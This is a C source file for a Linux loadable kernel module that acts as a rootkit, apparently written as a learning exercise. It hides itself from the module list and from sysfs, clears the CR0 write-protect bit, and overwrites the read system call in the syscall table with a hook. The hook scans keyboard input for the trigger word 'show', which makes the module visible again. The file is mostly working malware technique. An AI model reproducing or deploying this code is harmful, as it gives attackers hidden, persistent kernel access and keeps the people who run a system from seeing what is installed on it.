#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <asm/page.h>
#include <linux/kernfs.h>
#include <linux/rbtree.h>
#include <linux/hash.h>
#include <linux/cred.h>
#include <linux/sysfs.h>

#include "sysmap.h"
#define member rb

static struct list_head *module_previous;
static int  hidden = 0;
static int state = 0;
static int hstate = 0;

void **sys_call_table;

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

static void kernfs_remove_node(struct kernfs_node *kn)
{
	/* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
	 * Line 272@Linux/fs/kernfs/dir.c  
	 */	
	rb_erase(&kn->rb, &kn->parent->dir.children);
	RB_CLEAR_NODE(&kn->rb);
}

void delete_from_kernfs_tree(void){
    kernfs_remove_node(THIS_MODULE->mkobj.kobj.sd);
}

/* Function to hide the module */
void module_hide(void)
{
	if (hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	delete_from_kernfs_tree();	
	hidden = !hidden;
}

int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
{
	if(hash != kn->hash)
		return hash - kn->hash;
	if(ns != kn->ns)
		return ns - kn->ns;
	return strcmp(name,kn->name);

}

int kernfs_insert_node(struct kernfs_node *kn)
{
      struct rb_node **node = &kn->parent->dir.children.rb_node;
      struct rb_node *parent = NULL; 
	
      //printk("yaay! inside insert \n");

      while(*node)
      {
		struct kernfs_node *pos;
		int result;
		/* Get the kernfs_node from rb, rb_to_kn() */
		pos = rb_entry(*node, struct kernfs_node, member); 
		parent = *node;
		/*compare the names to get the position to insert in rb tree*/
		result = name_compare(kn->hash, kn->name, kn->ns, pos);
		//result = kernfs_sd_comapre(kn,pos);

		if(result < 0)
			node = &pos->rb.rb_left;
		else if(result > 0)
			node = &pos->rb.rb_right;
		else 
		{
			return -EEXIST;
		}
	}
	
	/* Add new node and reblance the tree*/
	rb_link_node(&kn->rb,parent,node);
	rb_insert_color(&kn->rb, &kn->parent->dir.children);
	
	/* Successfully added, account subdir number */
	if (kernfs_type(kn) == KERNFS_DIR)
                 kn->parent->dir.subdirs++;
	return 0;
}

void add_to_kernfs_tree(void){
    kernfs_insert_node(THIS_MODULE->mkobj.kobj.sd);
}

 
void module_show(void)
{
	printk("Unhiding module  %s\n",THIS_MODULE->name);
	if (!hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	add_to_kernfs_tree();	
	hidden = !hidden;
}

/* State machine to match word "ping" */
static void match_ping(char c)
{	
        switch(c)
        {
          case 'p':if(!state) state++;
                   break;

          case 'i':if(state == 1) state++;
                   break;

          case 'n':if(state == 2) state++;
                   break;

          case 'g':if(state == 3) {printk(KERN_INFO"PONG"); state = 0;}
                    break;

          default: state = 0;
                   break;
        }

	return;
}

/* State machine to match word "show" */
static void match_show(char c)
{
	switch(c)
        {
          case 's':if(!hstate) hstate++;
                   break;

          case 'h':if(hstate == 1) hstate++;
                   break;

          case 'o':if(hstate == 2) hstate++;
                   break;

          case 'w':if(hstate == 3) {hstate = 0; module_show();}
                    break;

          default: state = 0;
                   break;
        }
	return;
}

void scan_input(long count, char *buf)
{
        int i = 0;
        for(i = 0; i<count ; i++)
        {
		match_ping(buf[i]);
		match_show(buf[i]);	
	}
}

/*
 * Our manipulated read syscall. It will print every keystroke to the syslog
 * and call the original read afterwards.
 */
asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
        long ret;
        ret = original_read(fd,buf,count);

        //read from stdin and print it using printk
        if(ret >= 1 && fd == 0)
        {
		/* scan the input for the specific commands entered */
		scan_input(ret,buf);
        }

        return ret;
}

/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (value & 0x00010000)
        {
                value &= ~0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (!(value & 0x00010000))
        {
                value |= 0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}


static int __init hidemodule_init(void)
{
	printk(KERN_INFO "Loading hide_module LKM...\n");

        /* get the location of the sys_call_table from our sysmap.h file */
        sys_call_table = (void*) sysmap_sys_call_table;

        /* disable the write-protection */
        disable_page_protection();

        /*
         * keep pointer to original function in original_read, and
         * replace the system call in the system call table with
         * manipulated_read
         */
        original_read = (void *)sys_call_table[__NR_read];
        sys_call_table[__NR_read] = (unsigned long*)manipulated_read;

        /* reenable the write-protection */
        enable_page_protection();

	module_hide();
	
	return 0;
}

static void __exit hidemodule_exit(void)
{
	printk(KERN_INFO "Unloading hidden module... bye!\n");

        /* disable the write-protection */
        disable_page_protection();

        /* Return the system call back to original */
        sys_call_table[__NR_read] = (unsigned long *)original_read;

        /* reenable the write-protection */
        enable_page_protection();
}

module_init(hidemodule_init);
module_exit(hidemodule_exit);

